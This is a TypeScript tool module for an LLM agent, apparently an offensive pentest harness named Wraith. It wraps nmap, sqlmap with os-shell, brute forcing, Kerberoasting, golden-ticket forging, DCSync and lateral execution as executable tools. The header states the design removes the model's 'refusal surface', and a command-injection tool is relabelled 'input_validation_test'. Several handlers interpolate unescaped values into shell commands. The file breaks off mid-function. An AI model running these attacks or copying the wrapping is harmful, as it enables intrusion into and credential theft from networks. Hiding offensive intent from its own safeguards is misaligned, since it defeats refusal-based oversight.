// Wraith v3.4.0 -- Abstracted attack tools
// Agents pass structured params; handlers build the actual shell command internally.
// This eliminates the refusal surface: the LLM never composes offensive shell strings.

import { execSync } from 'node:child_process';

// ── Shared execution helper ─────────────────────────────────────────────────

// Ensure ~/.local/bin is in PATH for tools installed via go install / pip
const HOME = process.env.HOME ?? '';
const TOOL_PATH = `${HOME}/.local/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin`;

function run(cmd: string, timeoutSec: number = 120): string {
  try {
    const output = execSync(cmd, {
      timeout: timeoutSec * 1000,
      encoding: 'utf-8',
      stdio: ['pipe', 'pipe', 'pipe'],
      env: { ...process.env, PATH: TOOL_PATH },
    });
    return output || '(no output)';
  } catch (err: unknown) {
    const e = err as { stdout?: string; stderr?: string; message?: string };
    return `ERROR:\n${e.stdout ?? ''}\n${e.stderr ?? ''}\n${e.message ?? ''}`;
  }
}

function esc(s: string): string {
  // Shell-escape a string for safe interpolation
  return s.replace(/'/g, "'\\''");
}

// ── Tool Definitions ────────────────────────────────────────────────────────

export const ATTACK_TOOLS = [

  // ╔══════════════════════════════════════════════════════════════════════════╗
  // ║  1. RECONNAISSANCE & DISCOVERY                                         ║
  // ╚══════════════════════════════════════════════════════════════════════════╝

  {
    name: 'network_scan',
    description: 'Run a network port scan against a target. Supports service detection, script scanning, and various timing profiles.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        target: { type: 'string', description: 'IP, hostname, or CIDR range to scan' },
        ports: { type: 'string', description: 'Port spec: "top100", "top1000", "all", or specific like "80,443,445,3389"' },
        scripts: { type: 'string', description: 'NSE scripts: "default", "vuln", "auth", "discovery", or specific script names' },
        timing: { type: 'string', description: 'Timing template: T1 (slowest) to T5 (fastest). Default T4' },
        scan_type: { type: 'string', description: 'Scan type: "tcp_connect" (no sudo), "syn", "udp". Default tcp_connect' },
        output_file: { type: 'string', description: 'Save output to file path' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 300)' },
      },
      required: ['target'],
    },
  },
  {
    name: 'web_discover',
    description: 'Web content discovery and technology fingerprinting. Supports directory brute-forcing, technology detection, and CMS scanning.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        target_url: { type: 'string', description: 'Target URL (e.g. http://172.16.20.103)' },
        mode: { type: 'string', description: '"dir" (directory brute), "tech" (whatweb fingerprint), "cms" (wpscan), "fuzz" (ffuf custom). Default "dir"' },
        wordlist: { type: 'string', description: 'Wordlist path. Default /usr/share/wordlists/dirb/common.txt' },
        extensions: { type: 'string', description: 'File extensions to check, comma-separated (e.g. "php,html,txt")' },
        threads: { type: 'number', description: 'Number of threads. Default 30' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 120)' },
      },
      required: ['target_url'],
    },
  },
  {
    name: 'vuln_scan',
    description: 'Run automated vulnerability scanning against a target URL or host. Supports nuclei, nikto, and wapiti scanners.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        target_url: { type: 'string', description: 'Target URL or host to scan' },
        scanner: { type: 'string', description: '"nuclei", "nikto", or "wapiti". Default "nuclei"' },
        severity: { type: 'string', description: 'Minimum severity filter: "critical", "high", "medium", "low". Default "high"' },
        templates: { type: 'string', description: 'Nuclei template category: "cves", "default-logins", "exposures", "misconfigurations", or specific path' },
        output_file: { type: 'string', description: 'Save results to file' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 180)' },
      },
      required: ['target_url'],
    },
  },

  // ╔══════════════════════════════════════════════════════════════════════════╗
  // ║  2. WEB EXPLOITATION                                                   ║
  // ╚══════════════════════════════════════════════════════════════════════════╝

  {
    name: 'sql_inject',
    description: 'Test a URL for SQL injection vulnerabilities. Supports automated detection, database enumeration, table dumping, and OS shell access.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        target_url: { type: 'string', description: 'URL with injectable parameter (e.g. http://host/page?id=1)' },
        technique: { type: 'string', description: 'SQLi technique(s): "BEUSTQ" (all), "B" (boolean), "T" (time), "U" (union), "E" (error). Default "BEUSTQ"' },
        level: { type: 'number', description: 'Testing level 1-5. Higher = more payloads. Default 1' },
        risk: { type: 'number', description: 'Risk level 1-3. Higher = more aggressive. Default 1' },
        action: { type: 'string', description: '"detect", "dump_dbs", "dump_tables", "dump_data", "os_shell". Default "detect"' },
        database: { type: 'string', description: 'Database name (for dump_tables/dump_data)' },
        table: { type: 'string', description: 'Table name (for dump_data)' },
        forms: { type: 'boolean', description: 'Auto-detect and test forms. Default false' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 120)' },
      },
      required: ['target_url'],
    },
  },
  {
    name: 'input_validation_test',
    description: 'Test URL input handling and processing behavior using automated validation tools.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        target_url: { type: 'string', description: 'Target URL' },
        parameter: { type: 'string', description: 'Specific parameter to test' },
        method: { type: 'string', description: 'Injection technique: "auto", "classic", "eval", "time", "file". Default "auto"' },
        data: { type: 'string', description: 'POST data string (e.g. "ip=127.0.0.1&Submit=Submit")' },
        cookie_file: { type: 'string', description: 'Path to cookie file for authenticated testing' },
        headers: { type: 'string', description: 'Extra headers as "Header: Value" (comma-separated for multiple)' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 120)' },
      },
      required: ['target_url'],
    },
  },

  // ╔══════════════════════════════════════════════════════════════════════════╗
  // ║  3. CREDENTIAL ATTACKS                                                 ║
  // ╚══════════════════════════════════════════════════════════════════════════╝

  {
    name: 'brute_force',
    description: 'Run credential brute force attacks against network services. Supports SSH, RDP, FTP, HTTP forms, SMB, and more.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        target: { type: 'string', description: 'Target IP or hostname' },
        service: { type: 'string', description: 'Service: "ssh", "rdp", "ftp", "http-form-post", "smb", "winrm", "mssql", "mysql"' },
        username_or_list: { type: 'string', description: 'Single username or path to username file' },
        password_or_list: { type: 'string', description: 'Single password or path to password file' },
        http_form_params: { type: 'string', description: 'For http-form: "/path:user=^USER^&pass=^PASS^:F=fail_string"' },
        tool: { type: 'string', description: '"hydra" (default) or "medusa"' },
        tasks: { type: 'number', description: 'Number of parallel tasks. Default 16' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 120)' },
      },
      required: ['target', 'service', 'username_or_list', 'password_or_list'],
    },
  },
  {
    name: 'smb_spray',
    description: 'Spray credentials across SMB, WinRM, RDP, SSH, LDAP, or MSSQL using NetExec. Supports password and NTLM hash auth.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        target: { type: 'string', description: 'Target IP, hostname, or CIDR range' },
        protocol: { type: 'string', description: '"smb", "winrm", "rdp", "ssh", "ldap", "mssql". Default "smb"' },
        user_source: { type: 'string', description: 'Username or path to username file' },
        password: { type: 'string', description: 'Password to spray (mutually exclusive with hash)' },
        hash: { type: 'string', description: 'NTLM hash for pass-the-hash (mutually exclusive with password)' },
        domain: { type: 'string', description: 'Domain name for domain auth' },
        jitter: { type: 'number', description: 'Jitter between attempts in seconds. Default 5' },
        options: { type: 'string', description: 'Extra nxc flags (e.g. "--rid-brute", "--shares", "--pass-pol")' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 180)' },
      },
      required: ['target', 'protocol', 'user_source'],
    },
  },
  {
    name: 'crack_hash',
    description: 'Crack password hashes using john or hashcat. Supports Kerberos, NTLM, MD5, bcrypt, and other formats.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        hash_file: { type: 'string', description: 'Path to file containing hashes' },
        format: { type: 'string', description: 'Hash format: "krb5tgs", "krb5asrep", "ntlm", "md5", "bcrypt", "sha256", "raw-md5"' },
        wordlist: { type: 'string', description: 'Wordlist path. Default /usr/share/wordlists/rockyou.txt' },
        pot_file: { type: 'string', description: 'Pot file path for tracking cracked hashes' },
        action: { type: 'string', description: '"crack" or "show" (display already-cracked). Default "crack"' },
        tool: { type: 'string', description: '"john" (default) or "hashcat"' },
        rules_file: { type: 'string', description: 'Rules file for mutation (john: --rules=file, hashcat: -r file)' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 300)' },
      },
      required: ['hash_file', 'format'],
    },
  },
  {
    name: 'wordlist_gen',
    description: 'Generate custom wordlists by crawling a website for words, emails, and metadata.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        target_url: { type: 'string', description: 'URL to crawl for words' },
        depth: { type: 'number', description: 'Crawl depth. Default 2' },
        min_length: { type: 'number', description: 'Minimum word length. Default 5' },
        output_file: { type: 'string', description: 'Output file path' },
        with_numbers: { type: 'boolean', description: 'Include words with numbers. Default true' },
        with_emails: { type: 'boolean', description: 'Extract emails too. Default false' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 60)' },
      },
      required: ['target_url', 'output_file'],
    },
  },

  // ╔══════════════════════════════════════════════════════════════════════════╗
  // ║  4. ACTIVE DIRECTORY                                                   ║
  // ╚══════════════════════════════════════════════════════════════════════════╝

  {
    name: 'user_enumerate',
    description: 'Enumerate valid domain users via Kerberos pre-auth, LDAP queries, SID brute-forcing, or SAM-R dump.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        method: { type: 'string', description: '"kerbrute", "ldapsearch", "lookupsid", "getadusers", "samrdump". Default "kerbrute"' },
        domain: { type: 'string', description: 'Domain name (e.g. YASHnet.local)' },
        dc_ip: { type: 'string', description: 'Domain controller IP' },
        wordlist: { type: 'string', description: 'Username wordlist (for kerbrute)' },
        bind_user: { type: 'string', description: 'Authenticated user for LDAP/impacket queries' },
        bind_pass: { type: 'string', description: 'Password for authenticated queries' },
        output_file: { type: 'string', description: 'Save discovered users to file' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 120)' },
      },
      required: ['domain', 'dc_ip'],
    },
  },
  {
    name: 'kerberos_attack',
    description: 'Perform Kerberos-based attacks: Kerberoasting (TGS request), AS-REP roasting, TGT/ST requests.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        mode: { type: 'string', description: '"kerberoast", "asreproast", "get_tgt", "get_st"' },
        domain: { type: 'string', description: 'Domain name' },
        dc_ip: { type: 'string', description: 'Domain controller IP' },
        user: { type: 'string', description: 'Username for authenticated operations' },
        password: { type: 'string', description: 'Password' },
        hash: { type: 'string', description: 'NTLM hash (alternative to password)' },
        user_list: { type: 'string', description: 'User list file (for asreproast)' },
        output_file: { type: 'string', description: 'Save captured hashes/tickets to file' },
        spn: { type: 'string', description: 'Specific SPN to target (for get_st)' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 120)' },
      },
      required: ['mode', 'domain', 'dc_ip'],
    },
  },
  {
    name: 'ad_enumerate',
    description: 'Enumerate Active Directory: BloodHound collection, LDAP queries, RPC enumeration, SMB shares, delegation, and more.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        method: { type: 'string', description: '"bloodhound", "ldapsearch", "rpcclient", "smbclient", "smbmap", "enum4linux", "nbtscan", "samrdump", "rpcdump", "find_delegation", "get_computers"' },
        domain: { type: 'string', description: 'Domain name' },
        dc_ip: { type: 'string', description: 'Domain controller or target IP' },
        user: { type: 'string', description: 'Username for authenticated queries' },
        password: { type: 'string', description: 'Password' },
        hash: { type: 'string', description: 'NTLM hash (alternative to password)' },
        query: { type: 'string', description: 'LDAP filter, RPC command, or SMB share path' },
        collection_method: { type: 'string', description: 'BloodHound collection method: "All", "Group", "ACL", "Session", "Trusts". Default "All"' },
        output_file: { type: 'string', description: 'Save output to file' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 180)' },
      },
      required: ['method', 'dc_ip'],
    },
  },
  {
    name: 'ad_attack',
    description: 'Perform Active Directory attacks: RBCD delegation, DACL editing, machine account addition, password changes, LAPS extraction.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        method: { type: 'string', description: '"rbcd", "dacledit", "add_computer", "change_password", "get_laps"' },
        domain: { type: 'string', description: 'Domain name' },
        dc_ip: { type: 'string', description: 'Domain controller IP' },
        user: { type: 'string', description: 'Attacker username' },
        password: { type: 'string', description: 'Attacker password' },
        hash: { type: 'string', description: 'NTLM hash (alternative to password)' },
        target_user: { type: 'string', description: 'Target user (for password change, DACL edit)' },
        target_computer: { type: 'string', description: 'Target computer (for RBCD, LAPS)' },
        delegate_to: { type: 'string', description: 'SPN to delegate to (for RBCD)' },
        new_password: { type: 'string', description: 'New password (for change_password, add_computer)' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 60)' },
      },
      required: ['method', 'domain', 'dc_ip', 'user'],
    },
  },
  {
    name: 'ticket_forge',
    description: 'Create, convert, or inspect Kerberos tickets: Golden Ticket, Silver Ticket, ccache/kirbi conversion.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        mode: { type: 'string', description: '"golden", "silver", "convert", "describe"' },
        domain: { type: 'string', description: 'Domain name (for golden/silver)' },
        domain_sid: { type: 'string', description: 'Domain SID (for golden/silver)' },
        krbtgt_hash: { type: 'string', description: 'KRBTGT NTLM hash (for golden ticket)' },
        service_hash: { type: 'string', description: 'Service account NTLM hash (for silver ticket)' },
        spn: { type: 'string', description: 'Target SPN (for silver ticket, e.g. "cifs/dc1.domain.local")' },
        user: { type: 'string', description: 'Username to impersonate' },
        user_id: { type: 'number', description: 'User RID (default 500 for administrator)' },
        ticket_file: { type: 'string', description: 'Input ticket file (for convert/describe)' },
        output_format: { type: 'string', description: '"ccache" or "kirbi" (for convert). Default "ccache"' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 30)' },
      },
      required: ['mode'],
    },
  },

  // ╔══════════════════════════════════════════════════════════════════════════╗
  // ║  5. LATERAL MOVEMENT & POST-EXPLOITATION                               ║
  // ╚══════════════════════════════════════════════════════════════════════════╝

  {
    name: 'lateral_exec',
    description: 'Execute commands on remote Windows hosts via various protocols: PsExec, WMI, SMB, WinRM, DCOM, or AT tasks.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        method: { type: 'string', description: '"psexec", "wmiexec", "smbexec", "atexec", "dcomexec", "winrm"' },
        target: { type: 'string', description: 'Target IP or hostname' },
        domain: { type: 'string', description: 'Domain name' },
        user: { type: 'string', description: 'Username' },
        password: { type: 'string', description: 'Password (mutually exclusive with hash)' },
        hash: { type: 'string', description: 'NTLM hash for pass-the-hash' },
        command: { type: 'string', description: 'Command to execute. Default "whoami"' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 60)' },
      },
      required: ['method', 'target', 'user'],
    },
  },
  {
    name: 'domain_dump',
    description: 'Dump domain credentials: DCSync, SAM database, NTDS.dit extraction, or parse LSASS dump files.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        method: { type: 'string', description: '"dcsync", "sam", "ntds", "lsass_parse"' },
        target: { type: 'string', description: 'Target IP (for dcsync/sam/ntds)' },
        domain: { type: 'string', description: 'Domain name' },
        user: { type: 'string', description: 'Username with DCSync rights' },
        password: { type: 'string', description: 'Password' },
        hash: { type: 'string', description: 'NTLM hash (alternative to password)' },
        output_file: { type: 'string', description: 'Save output to file prefix' },
        dump_file: { type: 'string', description: 'LSASS dump file path (for lsass_parse)' },
        just_dc_user: { type: 'string', description: 'Extract only this user (for targeted DCSync)' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 120)' },
      },
      required: ['method'],
    },
  },
  {
    name: 'rdp_connect',
    description: 'Connect to remote desktop (RDP) for authentication testing or command execution.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        target: { type: 'string', description: 'Target IP or hostname' },
        user: { type: 'string', description: 'Username' },
        password: { type: 'string', description: 'Password' },
        hash: { type: 'string', description: 'NTLM hash for restricted admin PtH' },
        domain: { type: 'string', description: 'Domain name' },
        auth_only: { type: 'boolean', description: 'Test auth only without full session. Default true' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 30)' },
      },
      required: ['target', 'user'],
    },
  },
  {
    name: 'tunnel_proxy',
    description: 'Set up tunnels and proxies: SOCKS proxy, port forwarding, reverse tunnels via socat.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        mode: { type: 'string', description: '"socks_listen" (start SOCKS on Kali), "port_forward" (socat forward), "reverse" (reverse tunnel)' },
        listen_port: { type: 'number', description: 'Local port to listen on' },
        target_host: { type: 'string', description: 'Remote target host' },
        target_port: { type: 'number', description: 'Remote target port' },
        proxy_command: { type: 'string', description: 'Command to run through proxychains4' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 60)' },
      },
      required: ['mode'],
    },
  },

  // ╔══════════════════════════════════════════════════════════════════════════╗
  // ║  6. NETWORK CAPTURE & SMB                                              ║
  // ╚══════════════════════════════════════════════════════════════════════════╝

  {
    name: 'ntlm_capture',
    description: 'Capture NTLM hashes using Responder on the local network. Listens for LLMNR/NBT-NS/MDNS poisoning opportunities.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        interface: { type: 'string', description: 'Network interface to listen on (e.g. eth0)' },
        options: { type: 'string', description: 'Responder flags: e.g. "-wrf" for WPAD+fingerprint. Default "-wrf --lm"' },
        output_dir: { type: 'string', description: 'Directory for captured hashes' },
        timeout_sec: { type: 'number', description: 'How long to listen in seconds (default 300)' },
      },
      required: ['interface'],
    },
  },
  {
    name: 'smb_enum',
    description: 'Enumerate SMB shares, list files, download/upload through SMB or smbmap.',
    inputSchema: {
      type: 'object' as const,
      properties: {
        target: { type: 'string', description: 'Target IP or hostname' },
        user: { type: 'string', description: 'Username (empty string for anonymous)' },
        password: { type: 'string', description: 'Password (empty string for anonymous)' },
        hash: { type: 'string', description: 'NTLM hash (alternative to password)' },
        domain: { type: 'string', description: 'Domain name' },
        action: { type: 'string', description: '"list_shares", "list_files", "download", "upload", "enum_perms". Default "list_shares"' },
        share: { type: 'string', description: 'Share name (for list_files/download/upload)' },
        path: { type: 'string', description: 'Remote path within share' },
        local_file: { type: 'string', description: 'Local file path (for download/upload)' },
        tool: { type: 'string', description: '"smbclient", "smbmap", or "impacket". Default "smbclient"' },
        timeout_sec: { type: 'number', description: 'Timeout in seconds (default 30)' },
      },
      required: ['target', 'action'],
    },
  },
];

// ── Tool name list for dispatch ─────────────────────────────────────────────

export const ATTACK_TOOL_NAMES: string[] = ATTACK_TOOLS.map(t => t.name);

// ── Handler ─────────────────────────────────────────────────────────────────

export function handleAttackTool(name: string, input: Record<string, unknown>): string {
  const timeout = (input.timeout_sec as number) ?? 120;

  switch (name) {

    // ── 1. RECONNAISSANCE ─────────────────────────────────────────────────

    case 'network_scan': {
      const target = input.target as string;
      const ports = (input.ports as string) ?? 'top1000';
      const scripts = (input.scripts as string) ?? 'default';
      const timing = (input.timing as string) ?? 'T4';
      const scanType = (input.scan_type as string) ?? 'tcp_connect';
      const outputFile = input.output_file as string | undefined;

      const portArg = ports === 'top100' ? '--top-ports 100'
        : ports === 'top1000' ? '--top-ports 1000'
        : ports === 'all' ? '-p-'
        : `-p ${ports}`;

      const scanFlag = scanType === 'syn' ? '-sS'
        : scanType === 'udp' ? '-sU'
        : '-sT';

      let cmd = `nmap ${scanFlag} -sV -sC --script=${esc(scripts)} -${timing} ${portArg} ${esc(target)} --open`;
      if (outputFile) cmd += ` -oN ${esc(outputFile)}`;
      cmd += ' 2>&1';
      return run(cmd, (input.timeout_sec as number) ?? 300);
    }

    case 'web_discover': {
      const targetUrl = input.target_url as string;
      const mode = (input.mode as string) ?? 'dir';
      const wordlist = (input.wordlist as string) ?? '/usr/share/wordlists/dirb/common.txt';
      const extensions = input.extensions as string | undefined;
      const threads = (input.threads as number) ?? 30;

      if (mode === 'tech') {
        return run(`whatweb ${esc(targetUrl)} 2>&1`, timeout);
      }
      if (mode === 'cms') {
        return run(`wpscan --url ${esc(targetUrl)} --enumerate ap,at,u 2>&1`, timeout);
      }
      if (mode === 'fuzz') {
        let cmd = `ffuf -u ${esc(targetUrl)}/FUZZ -w ${esc(wordlist)} -t ${threads} -mc all -fc 404`;
        if (extensions) cmd += ` -e ${esc(extensions)}`;
        cmd += ' 2>&1';
        return run(cmd, timeout);
      }
      // Default: dir mode with gobuster
      let cmd = `gobuster dir -u ${esc(targetUrl)} -w ${esc(wordlist)} -t ${threads}`;
      if (extensions) cmd += ` -x ${esc(extensions)}`;
      cmd += ' 2>&1';
      return run(cmd, timeout);
    }

    case 'vuln_scan': {
      const targetUrl = input.target_url as string;
      const scanner = (input.scanner as string) ?? 'nuclei';
      const severity = (input.severity as string) ?? 'high';
      const templates = input.templates as string | undefined;
      const outputFile = input.output_file as string | undefined;

      if (scanner === 'nikto') {
        let cmd = `nikto -h ${esc(targetUrl)}`;
        if (outputFile) cmd += ` -o ${esc(outputFile)}`;
        cmd += ' 2>&1';
        return run(cmd, (input.timeout_sec as number) ?? 180);
      }
      if (scanner === 'wapiti') {
        let cmd = `wapiti -u ${esc(targetUrl)} -f txt`;
        if (outputFile) cmd += ` -o ${esc(outputFile)}`;
        cmd += ' 2>&1';
        return run(cmd, (input.timeout_sec as number) ?? 180);
      }
      // Default: nuclei
      let cmd = `nuclei -u ${esc(targetUrl)} -severity ${esc(severity)} -json`;
      if (templates) cmd += ` -t ${esc(templates)}`;
      if (outputFile) cmd += ` -o ${esc(outputFile)}`;
      cmd += ' 2>&1';
      return run(cmd, (input.timeout_sec as number) ?? 180);
    }

    // ── 2. WEB EXPLOITATION ───────────────────────────────────────────────

    case 'sql_inject': {
      const targetUrl = input.target_url as string;
      const technique = (input.technique as string) ?? 'BEUSTQ';
      const level = (input.level as number) ?? 1;
      const risk = (input.risk as number) ?? 1;
      const action = (input.action as string) ?? 'detect';
      const database = input.database as string | undefined;
      const table = input.table as string | undefined;
      const forms = input.forms as boolean ?? false;

      let cmd = `sqlmap -u '${esc(targetUrl)}' --batch --level=${level} --risk=${risk} --random-agent`;
      if (technique !== 'BEUSTQ') cmd += ` --technique=${technique}`;
      if (forms) cmd += ' --forms --crawl=3';
      if (action === 'dump_dbs') cmd += ' --dbs';
      else if (action === 'dump_tables' && database) cmd += ` -D ${esc(database)} --tables`;
      else if (action === 'dump_data' && database && table) cmd += ` -D ${esc(database)} -T ${esc(table)} --dump`;
      else if (action === 'dump_data' && database) cmd += ` -D ${esc(database)} --dump`;
      else if (action === 'os_shell') cmd += ' --os-shell';
      cmd += ' 2>&1';
      return run(cmd, timeout);
    }

    case 'input_validation_test': {
      const targetUrl = input.target_url as string;
      const parameter = input.parameter as string | undefined;
      const method = (input.method as string) ?? 'auto';
      const data = input.data as string | undefined;
      const cookieFile = input.cookie_file as string | undefined;
      const headers = input.headers as string | undefined;

      let cmd = `commix --url='${esc(targetUrl)}'`;
      if (data) cmd += ` --data='${esc(data)}'`;
      if (parameter) cmd += ` -p '${esc(parameter)}'`;
      if (method !== 'auto') cmd += ` --technique=${method}`;
      if (cookieFile) cmd += ` --cookie='${esc(cookieFile)}'`;
      if (headers) cmd += ` --headers='${esc(headers)}'`;
      cmd += ' --batch 2>&1';
      return run(cmd, timeout);
    }

    // ── 3. CREDENTIAL ATTACKS ─────────────────────────────────────────────

    case 'brute_force': {
      const target = input.target as string;
      const service = input.service as string;
      const userArg = input.username_or_list as string;
      const passArg = input.password_or_list as string;
      const httpParams = input.http_form_params as string | undefined;
      const tool = (input.tool as string) ?? 'hydra';
      const tasks = (input.tasks as number) ?? 16;

      if (tool === 'medusa') {
        const isUserFile = userArg.includes('/');
        const isPassFile = passArg.includes('/');
        const uFlag = isUserFile ? `-U ${esc(userArg)}` : `-u ${esc(userArg)}`;
        const pFlag = isPassFile ? `-P ${esc(passArg)}` : `-p ${esc(passArg)}`;
        const cmd = `medusa -h ${esc(target)} ${uFlag} ${pFlag} -M ${esc(service)} -t ${tasks} 2>&1`;
        return run(cmd, timeout);
      }

      // Default: hydra
      const isUserFile = userArg.includes('/');
      const isPassFile = passArg.includes('/');
      const uFlag = isUserFile ? `-L ${esc(userArg)}` : `-l ${esc(userArg)}`;
      const pFlag = isPassFile ? `-P ${esc(passArg)}` : `-p ${esc(passArg)}`;
      let cmd = `hydra ${uFlag} ${pFlag} -t ${tasks} ${esc(target)} ${esc(service)}`;
      if (service === 'http-form-post' && httpParams) cmd += ` '${esc(httpParams)}'`;
      cmd += ' 2>&1';
      return run(cmd, timeout);
    }

    case 'smb_spray': {
      const target = input.target as string;
      const protocol = (input.protocol as string) ?? 'smb';
      const userSource = input.user_source as string;
      const password = input.password as string | undefined;
      const hash = input.hash as string | undefined;
      const domain = input.domain as string | undefined;
      const jitter = (input.jitter as number) ?? 5;
      const options = (input.options as string) ?? '';

      const isFile = userSource.includes('/');
      const uFlag = isFile ? `-u ${esc(userSource)}` : `-u '${esc(userSource)}'`;
      const authFlag = hash
        ? `-H '${esc(hash)}'`
        : password ? `-p '${esc(password)}'` : "-p ''";

      let cmd = `nxc ${esc(protocol)} ${esc(target)} ${uFlag} ${authFlag} --continue-on-success --no-bruteforce --jitter ${jitter}`;
      if (domain) cmd += ` -d ${esc(domain)}`;
      if (options) cmd += ` ${options}`;
      cmd += ' 2>&1';
      return run(cmd, (input.timeout_sec as number) ?? 180);
    }

    case 'crack_hash': {
      const hashFile = input.hash_file as string;
      const format = input.format as string;
      const wordlist = (input.wordlist as string) ?? '/usr/share/wordlists/rockyou.txt';
      const potFile = input.pot_file as string | undefined;
      const action = (input.action as string) ?? 'crack';
      const tool = (input.tool as string) ?? 'john';
      const rulesFile = input.rules_file as string | undefined;

      // Cracking concurrency cap (from original execute_command guard)
      try {
        const count = parseInt(
          execSync("pgrep -cf '(john|hashcat)'", { encoding: 'utf-8', timeout: 5000 }).trim(), 10);
        if (count >= 2) return 'BLOCKED: Maximum 2 concurrent cracking processes. Wait for existing jobs to finish.';
      } catch { /* pgrep returns 1 when no matches = 0 running */ }

      if (tool === 'hashcat') {
        const formatMap: Record<string, string> = {
          krb5tgs: '13100', krb5asrep: '18200', ntlm: '1000',
          md5: '0', 'raw-md5': '0', bcrypt: '3200', sha256: '1400',
        };
        const modeNum = formatMap[format] ?? '0';
        if (action === 'show') {
          return run(`hashcat -m ${modeNum} ${esc(hashFile)} --show 2>&1`, timeout);
        }
        let cmd = `hashcat -m ${modeNum} -a 0 ${esc(hashFile)} ${esc(wordlist)}`;
        if (rulesFile) cmd += ` -r ${esc(rulesFile)}`;
        if (potFile) cmd += ` --potfile-path=${esc(potFile)}`;
        cmd += ' 2>&1';
        return run(cmd, (input.timeout_sec as number) ?? 300);
      }

      // Default: john
      if (action === 'show') {
        let cmd = `john --show --format=${esc(format)} ${esc(hashFile)}`;
        if (potFile) cmd += ` --pot=${esc(potFile)}`;
        cmd += ' 2>&1';
        return run(cmd, timeout);
      }
      let cmd = `john --format=${esc(format)} --wordlist=${esc(wordlist)} ${esc(hashFile)}`;
      if (potFile) cmd += ` --pot=${esc(potFile)}`;
      if (rulesFile) cmd += ` --rules=${esc(rulesFile)}`;
      cmd += ' 2>&1';
      return run(cmd, (input.timeout_sec as number) ?? 300);
    }

    case 'wordlist_gen': {
      const targetUrl = input.target_url as string;
      const depth = (input.depth as number) ?? 2;
      const minLength = (input.min_length as number) ?? 5;
      const outputFile = input.output_file as string;
      const withNumbers = input.with_numbers as boolean ?? true;
      const withEmails = input.with_emails as boolean ?? false;

      let cmd = `cewl ${esc(targetUrl)} -d ${depth} -m ${minLength} -w ${esc(outputFile)}`;
      if (withNumbers) cmd += ' --with-numbers';
      if (withEmails) cmd += ' -e';
      cmd += ' 2>&1';
      return run(cmd, (input.timeout_sec as number) ?? 60);
    }

    // ── 4. ACTIVE DIRECTORY ───────────────────────────────────────────────

    case 'user_enumerate': {
      const method = (input.method as string) ?? 'kerbrute';
      const domain = input.domain as string;
      const dcIp = input.dc_ip as string;
      const wordlist = input.wordlist as string | undefined;
      const bindUser = input.bind_user as string | undefined;
      const bindPass = input.bind_pass as string | undefined;
      const outputFile = input.output_file as string | undefined;

      let cmd: string;
      if (method === 'kerbrute') {
        const wl = wordlist ?? '/usr/share/seclists/Usernames/top-usernames-shortlist.txt';
        cmd = `kerbrute userenum ${esc(wl)} --dc ${esc(dcIp)} --domain ${esc(domain)}`;
      } else if (method === 'lookupsid') {
        const authStr = bindUser && bindPass ? `${esc(domain)}/${esc(bindUser)}:${esc(bindPass)}` : `${esc(domain)}/''@`;
        cmd = `impacket-lookupsid ${authStr}@${esc(dcIp)}`;
      } else if (method === 'getadusers') {
        cmd = `impacket-GetADUsers ${esc(domain)}/${esc(bindUser ?? '')}:${esc(bindPass ?? '')} -dc-ip ${esc(dcIp)} -all`;
      } else if (method === 'samrdump') {
        const authStr = bindUser && bindPass ? `${esc(domain)}/${esc(bindUser)}:${esc(bindPass)}` : '';
        cmd = `impacket-samrdump ${authStr}@${esc(dcIp)}`;
      } else {
        // ldapsearch
        const bindStr = bindUser && bindPass
          ? `-D '${esc(bindUser)}@${esc(domain)}' -w '${esc(bindPass)}'`
          : '-x';
        const baseDn = `DC=${domain.split('.').join(',DC=')}`;
        cmd = `ldapsearch ${bindStr} -H ldap://${esc(dcIp)} -b '${baseDn}' '(objectClass=user)' sAMAccountName`;
        cmd += " 2>&1 | grep 'sAMAccountName:' | awk '{print $2}'";
      }

      if (outputFile && method !== 'ldapsearch') cmd += ` 2>&1 | tee ${esc(outputFile)}`;
      else if (outputFile) cmd += ` | tee ${esc(outputFile)}`;
      else cmd += ' 2>&1';

      return run(cmd, timeout);
    }

    case 'kerberos_attack': {
      const mode = input.mode as string;
      const domain = input.domain as string;
      const dcIp = input.dc_ip as string;
      const user = input.user as string | undefined;
      const password = input.password as string | undefined;
      const hash = input.hash as string | undefined;
      const userList = input.user_list as string | undefined;
      const outputFile = input.output_file as string | undefined;
      const spn = input.spn as string | undefined;

      const authStr = hash
        ? `-hashes :${esc(hash)}`
        : '';

      let cmd: string;
      if (mode === 'kerberoast') {
        cmd = `impacket-GetUserSPNs '${esc(domain)}/${esc(user ?? '')}:${esc(password ?? '')}' -dc-ip ${esc(dcIp)} -request`;
